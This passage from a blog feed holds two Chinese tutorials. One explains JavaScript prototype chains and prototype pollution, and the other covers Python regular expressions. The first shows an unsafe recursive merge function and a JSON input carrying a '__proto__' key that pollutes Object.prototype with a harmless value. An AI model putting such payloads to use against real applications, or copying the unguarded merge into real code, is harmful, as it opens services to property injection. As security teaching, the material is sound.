    <content type="html"><![CDATA[<h1 id="Nodejs原型链污染"><a href="#Nodejs原型链污染" class="headerlink" title="Nodejs原型链污染"></a>Nodejs原型链污染</h1><h2 id="Nodejs与JavaScript和JSON"><a href="#Nodejs与JavaScript和JSON" class="headerlink" title="Nodejs与JavaScript和JSON"></a>Nodejs与JavaScript和JSON</h2><p>有一些人在学习JavaScript时会分不清Nodejs和JavaScript之间的区别 如果没有node 那么我们的JavaScript代码则由浏览器中的JavaScript解析器进行解析 几乎所有的浏览器都配备了JavaScript的解析功能（最出名的就是google的v8） 这也是为什么我们能在f12中直接执行JavaScript的原因 而Nodejs则是由这个解析器单独从浏览器中拿出来 并进行了一系列的处理 最后成为了一个可以在服务端运行JavaScript的环境 这里看到一个很好的例子 学过java的师傅应该就明白了</p><p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207300014261.png" alt="image-20220730001418207"></p><p>那么JSON又是什么呢 简单概括一下就是JavaScript的对象表示方法 它表示的是声明对象的一种格式 由于我们从前端接收到的数据基本都是字符串 因此在服务端如果要将这些字符串处理为其他格式 比如对象 就需要用到JSON了</p><p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207300023195.png" alt="image-20220730002328146"></p><h2 id="原型对象（prototype）与原型连接点（-proto-）与原型链"><a href="#原型对象（prototype）与原型连接点（-proto-）与原型链" class="headerlink" title="原型对象（prototype）与原型连接点（__proto__）与原型链"></a>原型对象（<code>prototype</code>）与原型连接点（<code>__proto__</code>）与原型链</h2><p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301459737.png" alt="image-20220730145926681"></p><p>在c++或java这些面向对象的语言中 我们如果想要一个对象首先需要使用关键字class声明一个类 再使用关键字new一个对象出来 但是在JavaScript中没有class 以及类这种概念（为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖） 在JavaScript有这么两种声明对象的方式 为了好理解我们先引入类的思想</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">person</span>=new Object()<br>person.<span class="hljs-attribute">firstname</span>=<span class="hljs-string">&quot;John&quot;</span>;<br>person.<span class="hljs-attribute">lastname</span>=<span class="hljs-string">&quot;Doe&quot;</span>;<br>person.<span class="hljs-attribute">age</span>=50;<br>person.<span class="hljs-attribute">eyecolor</span>=<span class="hljs-string">&quot;blue&quot;</span>;<br><br>这种创建对象的方法还有另一种写法 如下<br>person=&#123;firstname:<span class="hljs-string">&quot;John&quot;</span>,lastname:<span class="hljs-string">&quot;Doe&quot;</span>,age:50,eyecolor:<span class="hljs-string">&quot;blue&quot;</span>&#125;;<br><br>这种方法通过直接实例化构造方法Object()来创建对象<br>function person(firstname,lastname,age,eyecolor)  这里创建了一个“类” 但是在JavaScript中叫做构造函数或者构造器<br>&#123;<br>    this.<span class="hljs-attribute">firstname</span>=firstname;<br>    this.<span class="hljs-attribute">lastname</span>=lastname;<br>    this.<span class="hljs-attribute">age</span>=age;<br>    this.<span class="hljs-attribute">eyecolor</span>=eyecolor;<br>&#125;<br>var <span class="hljs-attribute">myFather</span>=new person(<span class="hljs-string">&quot;John&quot;</span>,<span class="hljs-string">&quot;Doe&quot;</span>,50,<span class="hljs-string">&quot;blue&quot;</span>);通过这个“类”实例化对象<br>var <span class="hljs-attribute">myMother</span>=new person(<span class="hljs-string">&quot;Sally&quot;</span>,<span class="hljs-string">&quot;Rally&quot;</span>,48,<span class="hljs-string">&quot;green&quot;</span>);<br><br>这种方法先创建构造函数 再实例化构造函数 构造函数function也属于Object 如果对这里为什么属于Object而不属于Function有疑问请继续阅读 下面会解释<br></code></pre></td></tr></table></figure><p>既然是通过实例化Object来创建对象或创建构造函数</p><p>在JavaScript中有两个很特殊的对象 Function() 和 Object() 它们两个既是构造函数也是对象 作为对象是不是应该有一个“类”去作为他们的模板呢</p><p>对于Object()来说 要声明这么一个构造函数我们可以使用关键字function来创建 （在底层 使用function创建一个函数 其实就相当于这个过程）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Object</span>(<span class="hljs-params"></span>)<br>&#123;<br><br>&#125;<br>在底层为<br><span class="hljs-keyword">var</span> Object = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Function</span>(<span class="hljs-params"></span>);<br></code></pre></td></tr></table></figure><p>那么对于Function自己这个对象他是怎么来的呢 如果用Function.<code>__proto__</code>和Function.prototype进行比较发现二者是全等的 所以Function创造了自己 也创造了Object 所以JavaScript中 所有函数都是对象 而对象是通过函数创建的 因此<code>构造函数.prototype.__proto__ </code>应该是Object.prototype 而不是Function.prototype Function的作用是创建而不是继承</p><p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301402091.png" alt="image-20220730140259067"></p><p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301401083.png" alt="image-20220730140053998"></p><p>那么提到了<code>__proto__</code>和<code>prototype</code>我们就来说说这两个是什么东西</p><p>首先我们要了解以下概念</p><ul><li><code>__proto__</code>是任何一个对象拥有的属性 <code>prototype</code>是任何一个函数拥有的一个属性</li></ul><p>比如</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">person</span>=&#123;firstname:<span class="hljs-string">&quot;John&quot;</span>,lastname:<span class="hljs-string">&quot;Doe&quot;</span>,age:<span class="hljs-number">50</span>,eyecolor:<span class="hljs-string">&quot;blue&quot;</span>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>那么这个person对象就拥有了<code>person.__proto__</code>这个属性 而Object()我们刚才提到了是由Function创建来的一个构造函数 那么Object就天生有了Object.prototype</p><ul><li>某一对象的 <code>__proto__</code>指向它的prototype（原型对象） 也就是说如果直接访问<code>person.__proto__</code> 那么就相当于访问了Object.prototype</li><li>JavaScript使用prototype链实现继承机制</li><li>构造函数xxx.prototype是一个对象 xxx.prototype也有自己的<code>__proto__</code>属性 并且可以继续指向它的的prototype</li><li>Object.prototype.proto最终指向null 这也是所有原型链的终点</li><li>从一个对象的<code>__proto__</code>不断向上指向原型对象最终指向Objecct.prototype后接着指向为Null 这一条链子就叫做原型链</li></ul><p>有条件的师傅也可以把下面的视频合集看一下 对理解原型和原型链有很大的帮助</p><p><a href="https://www.bilibili.com/video/BV1ci4y157Ci?p=4&spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=ce28d3130b8ba56f85e090c857c00132">4_Function与Object的特殊性_哔哩哔哩_bilibili</a></p><p>如果我们有如下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">$&#123;son.first_name&#125;</span> <span class="hljs-subst">$&#123;son.last_name&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><p>那么按照上述说法 就有如下结构</p><p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301504781.png" alt="image-20220730150413742"></p><p>对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。</li></ol><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>举个栗子</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// 这个对象直接实例化Object()</span><br>let foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br><br><span class="hljs-comment">// foo.bar 此时为1</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(foo.bar)<br><br><span class="hljs-comment">// 修改foo的原型（即Object）</span><br>foo.__proto__.bar = <span class="hljs-number">2</span><br><br><span class="hljs-comment">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(foo.bar)<br><br><span class="hljs-comment">// 此时再用Object创建一个空的zoo对象</span><br>let zoo = &#123;&#125;<br><br><span class="hljs-comment">// 查看zoo.bar</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(zoo.bar)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301540927.png" alt="image-20220730154030880"></p><p>这里由于修改了<code>foo.__proto__.bar</code> 也就是修改了Object.bar 因此在后续的实例化对象中 新的对象会继承这一属性 造成了原型链污染</p><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p><p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可</p><p>看下面代码 一个简单的对象clone</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">function <span class="hljs-built_in">merge</span>(target, source) &#123;<br>    <span class="hljs-keyword">for</span> (let key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;  <br>            <span class="hljs-comment">// 如果target与source有相同的键名 则让target的键值为source的键值</span><br>            <span class="hljs-built_in">merge</span>(target<span class="hljs-selector-attr">[key]</span>, source<span class="hljs-selector-attr">[key]</span>)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target<span class="hljs-selector-attr">[key]</span> = source<span class="hljs-selector-attr">[key]</span>  <span class="hljs-comment">// 如果target与source没有相通的键名 则直接在target新建键名并赋给键值</span><br>        &#125;<br>    &#125;<br>&#125;<br>let o1 = &#123;&#125;<br>let o2 = &#123;<span class="hljs-selector-tag">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-selector-tag">b</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(o1, o2)</span></span><br>console<span class="hljs-selector-class">.log</span>(o1<span class="hljs-selector-class">.a</span>, o1.b)<br><br>o3 = &#123;&#125;<br>console<span class="hljs-selector-class">.log</span>(o3.b)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301550219.png" alt="image-20220730155049173"></p><p>这里执行后发现 虽然两个对象成功clone 但是Object()并没用被污染 这是因为在创建o2时 <code>__proto__</code>是已经存在于o2中的属性了 解析器并不能将这个属性解析为键值 所以要用JSON去修改代码（前面我们说了 JSON是JavaScript的对象表示方法 可以将字符串转换为对象） 这样就可以使<code>__proto__</code>被成功解析成键名了</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;)<br><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(o1, o2)</span></span><br><span class="hljs-function"><span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(o1.a, o1.b)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">o3</span> = &#123;&#125;</span><br><span class="hljs-function"><span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(o3.b)</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301555313.png" alt="image-20220730155547273"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里先留个坑 这篇文章写了一整天一直在改 参考了很多视频和文章 复现就留到过几天再更新吧</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a></p><p><a href="https://www.bilibili.com/video/BV1ci4y157Ci?p=1&vd_source=ce28d3130b8ba56f85e090c857c00132">【全网首发:已完结】快速搞懂『原型、原型链』【JavaScript基础专题】_哔哩哔哩_bilibili</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/07/28/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2022/07/28/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>字符串是编程时涉及到的最多的一种数据结构，对字符串进行操作的需求几乎无处不在。比如判断一个字符串是否是合法的Email地址，虽然可以编程提取<code>@</code>前后的子串，再分别判断是否是单词和域名，但这样做不但麻烦，而且代码难以复用。</p><p>正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则，凡是符合规则的字符串，我们就认为它“匹配”了，否则，该字符串就是不合法的。</p><p>所以我们判断一个字符串是否是合法的Email的方法是：</p><ol><li>创建一个匹配Email的正则表达式；</li><li>用该正则表达式去匹配用户的输入来判断是否合法。</li></ol><p>因为正则表达式也是用字符串表示的，所以，我们要首先了解如何用字符来描述字符。</p><p>在正则表达式中，如果直接给出字符，就是精确匹配。用<code>\d</code>可以匹配一个数字，<code>\w</code>可以匹配一个字母或数字，所以：</p><ul><li><code>&#39;00\d&#39;</code>可以匹配<code>&#39;007&#39;</code>，但无法匹配<code>&#39;00A&#39;</code>；</li><li><code>&#39;\d\d\d&#39;</code>可以匹配<code>&#39;010&#39;</code>；</li><li><code>&#39;\w\w\d&#39;</code>可以匹配<code>&#39;py3&#39;</code>；</li></ul><p><code>.</code>可以匹配任意字符，所以：</p><ul><li><code>&#39;py.&#39;</code>可以匹配<code>&#39;pyc&#39;</code>、<code>&#39;pyo&#39;</code>、<code>&#39;py!&#39;</code>等等。</li></ul><p>要匹配变长的字符，在正则表达式中，用<code>*</code>表示任意个字符（包括0个），用<code>+</code>表示至少一个字符，用<code>?</code>表示0个或1个字符，用<code>&#123;n&#125;</code>表示n个字符，用<code>&#123;n,m&#125;</code>表示n-m个字符：</p><p>来看一个复杂的例子：<code>\d&#123;3&#125;\s+\d&#123;3,8&#125;</code>。</p><p>我们来从左到右解读一下：</p><ol><li><code>\d&#123;3&#125;</code>表示匹配3个数字，例如<code>&#39;010&#39;</code>；</li><li><code>\s</code>可以匹配一个空格（也包括Tab等空白符），所以<code>\s+</code>表示至少有一个空格，例如匹配<code>&#39; &#39;</code>，<code>&#39; &#39;</code>等；</li><li><code>\d&#123;3,8&#125;</code>表示3-8个数字，例如<code>&#39;1234567&#39;</code>。</li></ol><p>综合起来，上面的正则表达式可以匹配以任意个空格隔开的带区号的电话号码。</p><p>如果要匹配<code>&#39;010-12345&#39;</code>这样的号码呢？由于<code>&#39;-&#39;</code>是特殊字符，在正则表达式中，要用<code>&#39;\&#39;</code>转义，所以，上面的正则是<code>\d&#123;3&#125;\-\d&#123;3,8&#125;</code>。</p><p>但是，仍然无法匹配<code>&#39;010 - 12345&#39;</code>，因为带有空格。所以我们需要更复杂的匹配方式。</p><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><p>要做更精确地匹配，可以用<code>[]</code>表示范围，比如：</p><ul><li><code>[0-9a-zA-Z\_]</code>可以匹配一个数字、字母或者下划线；</li><li><code>[0-9a-zA-Z\_]+</code>可以匹配至少由一个数字、字母或者下划线组成的字符串，比如<code>&#39;a100&#39;</code>，<code>&#39;0_Z&#39;</code>，<code>&#39;Py3000&#39;</code>等等；</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]*</code>可以匹配由字母或下划线开头，后接任意个由一个数字、字母或者下划线组成的字符串，也就是Python合法的变量；</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]&#123;0, 19&#125;</code>更精确地限制了变量的长度是1-20个字符（前面1个字符+后面最多19个字符）。</li></ul><p><code>A|B</code>可以匹配A或B，所以<code>(P|p)ython</code>可以匹配<code>&#39;Python&#39;</code>或者<code>&#39;python&#39;</code>。</p><p><code>^</code>表示行的开头，<code>^\d</code>表示必须以数字开头。</p><p><code>$</code>表示行的结束，<code>\d$</code>表示必须以数字结束。</p><p>你可能注意到了，<code>py</code>也可以匹配<code>&#39;python&#39;</code>，但是加上<code>^py$</code>就变成了整行匹配，就只能匹配<code>&#39;py&#39;</code>了。</p><h3 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h3><p>有了准备知识，我们就可以在Python中使用正则表达式了。Python提供<code>re</code>模块，包含所有正则表达式的功能。由于Python的字符串本身也用<code>\</code>转义，所以要特别注意：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">s</span> = <span class="hljs-string">&#x27;ABC\\-001&#x27;</span> <span class="hljs-comment"># Python的字符串</span><br><span class="hljs-comment"># 对应的正则表达式字符串变成：</span><br><span class="hljs-comment"># &#x27;ABC\-001&#x27;</span><br></code></pre></td></tr></table></figure><p>因此我们强烈建议使用Python的<code>r</code>前缀，就不用考虑转义的问题了：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">s = <span class="hljs-string">r&#x27;ABC\-001&#x27;</span> <span class="hljs-comment"># Python的字符串</span><br><span class="hljs-comment"># 对应的正则表达式字符串不变：</span><br><span class="hljs-comment"># &#x27;ABC\-001&#x27;</span><br></code></pre></td></tr></table></figure><p>先看看如何判断正则表达式是否匹配：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> re</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#x27;</span>, <span class="hljs-string">&#x27;010-12345&#x27;</span>)</span><br>&lt;_sre.SRE_Match object; span=(0, 9), match=&#x27;010-12345&#x27;&gt;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#x27;</span>, <span class="hljs-string">&#x27;010 12345&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span><br></code></pre></td></tr></table></figure><p><code>match()</code>方法判断是否匹配，如果匹配成功，返回一个<code>Match</code>对象，否则返回<code>None</code>。常见的判断方法就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">test = <span class="hljs-string">&#x27;用户输入的字符串&#x27;</span><br><span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;正则表达式&#x27;</span>, test):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;failed&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="切分字符串"><a href="#切分字符串" class="headerlink" title="切分字符串"></a>切分字符串</h3><p>用正则表达式切分字符串比用固定的字符更灵活，请看正常的切分代码：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; <span class="hljs-string">&#x27;a b   c&#x27;</span><span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>]</span><br></code></pre></td></tr></table></figure><p>嗯，无法识别连续的空格，用正则表达式试试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>re.split(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27;a b   c&#x27;</span>)<br>[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>]<br></code></pre></td></tr></table></figure><p>无论多少个空格都可以正常分割。加入<code>,</code>试试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>re.split(<span class="hljs-string">r&#x27;[\s\,]+&#x27;</span>, <span class="hljs-string">&#x27;a,b, c  d&#x27;</span>)<br>[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>]<br></code></pre></td></tr></table></figure><p>再加入<code>;</code>试试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>re.split(<span class="hljs-string">r&#x27;[\s\,\;]+&#x27;</span>, <span class="hljs-string">&#x27;a,b;; c  d&#x27;</span>)<br>[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>]<br></code></pre></td></tr></table></figure><p>如果用户输入了一组标签，下次记得用正则表达式来把不规范的输入转化成正确的数组。</p><h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><p>除了简单地判断是否匹配之外，正则表达式还有提取子串的强大功能。用<code>()</code>表示的就是要提取的分组（Group）。比如：</p><p><code>^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$</code>分别定义了两个组，可以直接从匹配的字符串中提取出区号和本地号码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>m = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;</span>, <span class="hljs-string">&#x27;010-12345&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>m<br>&lt;_sre.SRE_Match <span class="hljs-built_in">object</span>; span=(<span class="hljs-number">0</span>, <span class="hljs-number">9</span>), <span class="hljs-keyword">match</span>=<span class="hljs-string">&#x27;010-12345&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>m.group(<span class="hljs-number">0</span>)<br><span class="hljs-string">&#x27;010-12345&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m.group(<span class="hljs-number">1</span>)<br><span class="hljs-string">&#x27;010&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m.group(<span class="hljs-number">2</span>)<br><span class="hljs-string">&#x27;12345&#x27;</span><br></code></pre></td></tr></table></figure><p>如果正则表达式中定义了组，就可以在<code>Match</code>对象上用<code>group()</code>方法提取出子串来。</p><p>注意到<code>group(0)</code>永远是与整个正则表达式相匹配的字符串，<code>group(1)</code>、<code>group(2)</code>……表示第1、2、……个子串。</p><p>提取子串非常有用。来看一个更凶残的例子：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">&gt;&gt;&gt; t = &#x27;19:05:30&#x27;<br>&gt;&gt;&gt; m = re.match(r&#x27;^(0<span class="hljs-comment">[0-9]</span>|1<span class="hljs-comment">[0-9]</span>|2<span class="hljs-comment">[0-3]</span>|<span class="hljs-comment">[0-9]</span>)\:(0<span class="hljs-comment">[0-9]</span>|1<span class="hljs-comment">[0-9]</span>|2<span class="hljs-comment">[0-9]</span>|3<span class="hljs-comment">[0-9]</span>|4<span class="hljs-comment">[0-9]</span>|5<span class="hljs-comment">[0-9]</span>|<span class="hljs-comment">[0-9]</span>)\:(0<span class="hljs-comment">[0-9]</span>|1<span class="hljs-comment">[0-9]</span>|2<span class="hljs-comment">[0-9]</span>|3<span class="hljs-comment">[0-9]</span>|4<span class="hljs-comment">[0-9]</span>|5<span class="hljs-comment">[0-9]</span>|<span class="hljs-comment">[0-9]</span>)$&#x27;, t)<br>&gt;&gt;&gt; m.groups()<br>(&#x27;19&#x27;, &#x27;05&#x27;, &#x27;30&#x27;)<br></code></pre></td></tr></table></figure><p>这个正则表达式可以直接识别合法的时间。但是有些时候，用正则表达式也无法做到完全验证，比如识别日期：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">&#x27;^(0<span class="hljs-comment">[1-9]</span>|1<span class="hljs-comment">[0-2]</span>|<span class="hljs-comment">[0-9]</span>)-(0<span class="hljs-comment">[1-9]</span>|1<span class="hljs-comment">[0-9]</span>|2<span class="hljs-comment">[0-9]</span>|3<span class="hljs-comment">[0-1]</span>|<span class="hljs-comment">[0-9]</span>)$&#x27;<br></code></pre></td></tr></table></figure><p>对于<code>&#39;2-30&#39;</code>，<code>&#39;4-31&#39;</code>这样的非法日期，用正则还是识别不了，或者说写出来非常困难，这时就需要程序配合识别了。</p><h3 